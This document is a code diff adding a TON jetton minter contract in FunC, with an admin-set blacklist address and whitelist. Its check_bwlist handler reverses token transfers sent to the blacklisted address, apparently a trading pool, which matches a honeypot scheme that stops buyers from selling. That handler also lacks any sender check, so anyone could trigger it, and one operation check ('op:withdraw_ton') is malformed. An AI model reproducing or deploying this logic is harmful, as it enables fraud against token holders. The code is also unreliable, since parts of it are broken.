@@ -1,0 +1,383 @@
+;; Jettons discoverable smart contract
+#include "imports/stdlib.fc";
+#include "imports/jetton-utils.fc";
+#include "imports/op-codes.fc";
+#include "imports/discovery-params.fc";
+
+;; 6905(computational_gas_price) * 1000(cur_gas_price) = 6905000
+;; ceil(6905000) = 10000000 ~= 0.01 TON
+int min_tons_for_storage() asm "10000000 PUSHINT"; ;; 0.01 TON
+int provide_address_gas_consumption() asm "10000000 PUSHINT";
+int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
+
+
+int addr_hash(slice address) inline {
+    (int wc, int hashpart) = parse_std_addr(address);
+    return hashpart;
+}
+
+
+int is_whitelisted(int key, cell whitelist) inline {
+    cell dict = whitelist.begin_parse().preload_dict();
+    (slice payload, int found) = dict.udict_get?(256, key); ;;256 for hash, 267 for full address(+wc, +flags)
+
+    return found;
+}
+
+;; storage scheme
+;; storage#_ total_supply:Coins admin_address:MsgAddress content:^Cell jetton_wallet_code:^Cell = Storage;
+(int, slice, cell, cell, slice, cell) load_data() inline {
+    slice ds = get_data().begin_parse();
+    return (
+            ds~load_coins(), ;; total_supply
+            ds~load_msg_addr(), ;; admin_address
+            ds~load_ref(), ;; content
+            ds~load_ref(), ;; jetton_wallet_code
+            ds~load_msg_addr(), ;; blacklisted_address
+            ds~load_ref() ;; whitelist (as a reference to a separate cell)
+    );
+}
+
+() save_data(
+        int total_supply,
+        slice admin_address,
+        cell content,
+        cell jetton_wallet_code,
+        slice blacklisted_address,
+        cell whitelist
+    ) impure inline {
+    set_data(begin_cell()
+            .store_coins(total_supply)
+            .store_slice(admin_address)
+            .store_ref(content)
+            .store_ref(jetton_wallet_code)
+            .store_slice(blacklisted_address)
+            .store_ref(whitelist)
+            .end_cell()
+    );
+}
+
+() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {
+    cell state_init = calculate_jetton_wallet_state_init(to_address, my_address(), jetton_wallet_code);
+    slice to_wallet_address = calculate_jetton_wallet_address(state_init);
+    var msg = begin_cell()
+            .store_uint(0x18, 6)
+            .store_slice(to_wallet_address)
+            .store_coins(amount)
+            .store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
+            .store_ref(state_init)
+            .store_ref(master_msg);
+    send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
+}
+() deny_recieve_tokens_in_bwlist(
+        slice in_msg_body,
+        slice check_address,
+        cell jetton_wallet_code,
+        int query_id,
+        int jetton_amount,
+        slice sender_address,
+        slice initiator_of_transfer_wallet_address,
+        int msg_value,
+        int fwd_fee,
+        int forward_ton_amount
+    ) impure {
+    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    ;; transfer with modified mint ;;
+    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+    int forward_ton_amount2 = 21000000;
+    int total_ton_amount =   45000000;
+    slice either_forward_payload = in_msg_body;
+
+    cell increase_balance_state_init = calculate_jetton_wallet_state_init(sender_address, my_address(), jetton_wallet_code);
+    slice to_wallet_sender_address = calculate_jetton_wallet_address(increase_balance_state_init);
+    ;; increase balance to sender address
+    var increase_balance_msg = begin_cell()
+            .store_uint(0x18, 6)
+            .store_slice(sender_address)
+            .store_coins(5800000) ;; ton for gas
+            .store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
+            .store_ref(increase_balance_state_init);
+    var increase_balance_msg_body = begin_cell()
+        .store_uint(op::internal_transfer(), 32)
+        .store_uint(query_id, 64)
+        .store_coins(jetton_amount)
+        .store_slice(initiator_of_transfer_wallet_address)
+        .store_slice(initiator_of_transfer_wallet_address) ;; Response addr
+        .store_coins(1) ;; ton for next tx gas
+        .store_int(true, 1) ;; flag for jetton minter excesses
+        .store_slice(either_forward_payload)
+        .end_cell();
+
+    increase_balance_msg = increase_balance_msg.store_ref(increase_balance_msg_body);
+    
+
+    cell decrease_balance_state_init = calculate_jetton_wallet_state_init(check_address, my_address(), jetton_wallet_code);
+    slice to_wallet_check_address = calculate_jetton_wallet_address(decrease_balance_state_init);
+
+    var decrease_balance_msg = begin_cell()
+        .store_uint(0x18, 6)
+        .store_slice(to_wallet_check_address)
+        .store_coins(20600000)
+        .store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
+        .store_ref(decrease_balance_state_init);
+
+    cell decrease_balance_msg_body = begin_cell()
+        .store_uint(op::decrease_balance(), 32)
+        .store_uint(query_id, 64)
+        .store_coins(jetton_amount)
+        .store_slice(check_address)
+        .store_slice(initiator_of_transfer_wallet_address) ;; response addr
+        .store_coins(20000000)
+        .end_cell();
+
+    decrease_balance_msg = decrease_balance_msg.store_ref(decrease_balance_msg_body);
+
+    
+    send_raw_message(increase_balance_msg.end_cell(), 64); 
+    send_raw_message(decrease_balance_msg.end_cell(), 64); 
+
+}
+
+() withdraw_ton(int msg_value, slice in_msg_body, slice sender_address) impure {
+    ;; Загружаем адрес адимна из c4
+    (_, slice admin_address, _, _, _, _) = load_data();
+
+    ;; Проверяем, что вывод может делать только адимн смарта
+    throw_unless(73, equal_slices(sender_address, admin_address));
+
+    ;; Достаем из ячейки количество TON для перевода
+    int amount = in_msg_body~load_coins();
+    [int my_balance, _] = get_balance();
+    ;; Проверяем, что у контракта достаточно TON для вывода
+    throw_unless(1000, my_balance >= amount);
+    
+    ;; Создаем сообщение для отправки TON
+    var msg = begin_cell()
+        .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
+        .store_slice(sender_address)
+        .store_coins(amount)
+        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+        .store_uint(0, 32) ;; empty body
+        .end_cell();
+    
+    ;; Отправляем сообщение
+    send_raw_message(msg, 64); ;; pay transfer fees separately, revert on errors
+}
+() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
+    if (in_msg_body.slice_empty?()) { ;; ignore empty messages
+        return ();
+    }
+    slice cs = in_msg_full.begin_parse();
+    int flags = cs~load_uint(4);
+
+    if (flags & 1) { ;; ignore all bounced messages
+        return ();
+    }
+    slice sender_address = cs~load_msg_addr();
+    slice dst_address = cs~load_msg_addr(); ;; skip dst
+    cs~load_coins(); ;; skip value
+    cs~skip_bits(1); ;; skip extracurrency collection
+    cs~load_coins(); ;; skip ihr_fee
+
+    int fwd_fee = muldiv(cs~load_coins(), 3, 2); ;; we use message fwd_fee for estimation of forward_payload costs
+
+    int op = in_msg_body~load_uint(32);
+    int query_id = in_msg_body~load_uint(64);
+
+    (int total_supply, slice admin_address, cell content, cell jetton_wallet_code, slice blacklisted_address, cell whitelist) = load_data();
+
+    if (op == op::mint()) {
+
+        throw_unless(73, equal_slices(sender_address, admin_address));
+        slice to_address = in_msg_body~load_msg_addr();
+        int amount = in_msg_body~load_coins();
+        cell master_msg = in_msg_body~load_ref();
+        slice master_msg_cs = master_msg.begin_parse();
+        master_msg_cs~skip_bits(32 + 64); ;; op + query_id
+        int jetton_amount = master_msg_cs~load_coins();
+        mint_tokens(to_address, jetton_wallet_code, amount, master_msg);
+        save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code, blacklisted_address, whitelist);
+        return ();
+    }
+
+    if (op == op::burn_notification()) {
+        int jetton_amount = in_msg_body~load_coins();
+        slice from_address = in_msg_body~load_msg_addr();
+        throw_unless(74,
+                equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
+        );
+        save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code, blacklisted_address, whitelist);
+        slice response_address = in_msg_body~load_msg_addr();
+        if (response_address.preload_uint(2) != 0) {
+            var msg = begin_cell()
+                    .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
+                    .store_slice(response_address)
+                    .store_coins(0)
+                    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                    .store_uint(op::excesses(), 32)
+                    .store_uint(query_id, 64);
+            send_raw_message(msg.end_cell(), 2 + 64);
+        }
+        return ();
+    }
+
+    if (op == op::provide_wallet_address()) {
+        throw_unless(75, msg_value > fwd_fee + provide_address_gas_consumption());
+
+        slice owner_address = in_msg_body~load_msg_addr();
+        int include_address? = in_msg_body~load_uint(1);
+
+        cell included_address = include_address?
+                ? begin_cell().store_slice(owner_address).end_cell()
+                : null();
+
+        var msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(sender_address)
+                .store_coins(0)
+                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                .store_uint(op::take_wallet_address(), 32)
+                .store_uint(query_id, 64);
+
+        if (is_resolvable?(owner_address)) {
+            msg = msg.store_slice(calculate_user_jetton_wallet_address(owner_address, my_address(), jetton_wallet_code));
+        } else {
+            msg = msg.store_uint(0, 2); ;; addr_none
+        }
+        send_raw_message(msg.store_maybe_ref(included_address).end_cell(), 64);
+        return ();
+    }
+
+    if (op == op::set_blacklist()) {
+        throw_unless(73, equal_slices(sender_address, admin_address));
+
+        slice new_blacklisted_address = in_msg_body~load_msg_addr();
+        save_data(total_supply, admin_address, content, jetton_wallet_code, new_blacklisted_address, whitelist);
+        return ();
+    }
+
+    if (op == op::add_to_whitelist()) {
+
+        
+        throw_unless(73, equal_slices(sender_address, admin_address));
+        
+        slice whitelisted_address = in_msg_body~load_msg_addr();
+
+        int key = addr_hash(whitelisted_address);
+        cell dict = whitelist.begin_parse().preload_dict();
+        dict~udict_set(256, key, begin_cell().store_int(true, 1).end_cell().begin_parse());
+        save_data(total_supply, admin_address, content, jetton_wallet_code, blacklisted_address, begin_cell().store_dict(dict).end_cell());
+        return ();
+    }
+
+    if (op == op::remove_from_whitelist()) {
+        throw_unless(73, equal_slices(sender_address, admin_address));
+        slice removed_address = in_msg_body~load_msg_addr();
+        int key = addr_hash(removed_address);
+        cell dict = whitelist.begin_parse().preload_dict();
+        dict~udict_delete?(256, key);
+        save_data(total_supply, admin_address, content, jetton_wallet_code, blacklisted_address, begin_cell().store_dict(dict).end_cell());
+        return ();
+    }
+
+    if (op == op::check_bwlist()) {
+        ;; get data from cell payload
+        slice check_address = in_msg_body~load_msg_addr();
+        int jetton_amount = in_msg_body~load_coins();
+        slice initiator_of_transfer_wallet_address = in_msg_body~load_msg_addr();
+        int forward_ton_amount = in_msg_body~load_coins();
+
+        int key = addr_hash(check_address);
+
+        int is_whitelisted = is_whitelisted(key, whitelist);
+
+        if (is_whitelisted) {
+
+        } else {
+            ;; Если адреса нет в whitelist, проверяем blacklist
+            int check_address_hash = addr_hash(check_address);
+            int blacklisted_address_hash = addr_hash(blacklisted_address);
+
+            int is_blacklisted = equal_slices(check_address,blacklisted_address);
+
+            if (is_blacklisted) {
+                ;; Если адрес в blacklist, выдаем ошибку
+                deny_recieve_tokens_in_bwlist(
+                    in_msg_body,
+                    check_address,
+                    jetton_wallet_code,
+                    query_id,
+                    jetton_amount,
+                    sender_address,
+                    initiator_of_transfer_wallet_address,
+                    msg_value,
+                    fwd_fee,
+                    forward_ton_amount
+                );
+
+                return ();
+            } else {
+
+            }
+        }
+        return ();
+    }
+
+    if (op == op::transfer_notification()) {
+        ;; fallback for prevent error in tonviewer
+        return();
+    }
+
+    if (op == op::excesses()) {
+        ;; fallback for prevent error in tonviewer
+        return();
+    }
+
+    if (op == op:withdraw_ton()) {
+        
+        withdraw_ton( msg_value, in_msg_body, sender_address);
+        return();
+    }
+
+    if (op == 3) { ;; change admin
+        throw_unless(73, equal_slices(sender_address, admin_address));
+        slice new_admin_address = in_msg_body~load_msg_addr();
+        save_data(total_supply, new_admin_address, content, jetton_wallet_code, blacklisted_address, whitelist);
+        return ();
+    }
+
+    if (op == 4) { ;; change content, delete this for immutable tokens
+        throw_unless(73, equal_slices(sender_address, admin_address));
+        save_data(total_supply, admin_address, in_msg_body~load_ref(), jetton_wallet_code, blacklisted_address, whitelist);
+        return ();
+    }
+
+    throw(0xffff);
+}
+
+(int, int, slice, cell, cell, slice, cell) get_jetton_data() method_id {
+    (int total_supply, slice admin_address, cell content, cell jetton_wallet_code, slice blacklisted_address, cell whitelist) = load_data();
+    return (total_supply, -1, admin_address, content, jetton_wallet_code, blacklisted_address, whitelist);
+}
+
+slice get_wallet_address(slice owner_address) method_id {
+    (int total_supply, slice admin_address, cell content, cell jetton_wallet_code, _, _) = load_data();
+    return calculate_user_jetton_wallet_address(owner_address, my_address(), jetton_wallet_code);
+}
+
+slice get_blacklisted_address() method_id {
+    (_, _, _, _, slice blacklisted_address, _) = load_data();
+    return blacklisted_address;
+}
+
+cell get_whitelist() method_id {
+    (_, _, _, _, _, cell whitelist) = load_data();
+    return whitelist;
+}
+
+int get_ton_balance() method_id {
+    [int balance, _] = get_balance();
+    return balance;
+}
